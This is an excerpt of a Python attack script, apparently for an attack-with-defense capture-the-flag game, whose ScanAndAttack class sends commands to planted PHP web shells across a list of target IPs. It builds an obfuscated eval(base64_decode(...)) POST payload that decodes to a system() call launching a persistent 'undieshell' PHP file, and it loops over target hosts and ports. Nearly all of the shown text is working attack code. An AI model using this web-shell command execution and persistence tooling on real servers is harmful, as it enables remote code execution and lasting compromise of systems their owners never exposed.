...
class ScanAndAttack():
    ...
    def send_command_useful(self, url, passwd, method):
        ...
        if method == "post":
            data[passwd] = "@eval(base64_decode($_POST['z0']));"
            data['z0'] = 'c3lzdGVtKCdwaHAgL3RtcC9mdWNrLnBocCcpOw=='
            # print(data)
            try:
                res = requests.post(url, data=data)
            except:
...
if __name__ == "__main__":
    ...
    while(True):
        ...
        target_ips = ip_list("172.91.0.122")
        target_port = "8082"
        ...
        myPassWord = str(random.uniform(10, 20))
        shell_local_path = "/xxx/AWD-share/AWD/AWD_001/lib/undieshell.php"  # shell 的地址
        curl = r"""'ls';"""
        ...
        target_file = "/xxx/AWD/AWD_001/CTFs/{}/{}/Config/target_ip_list".format(ctf_name, web_num)
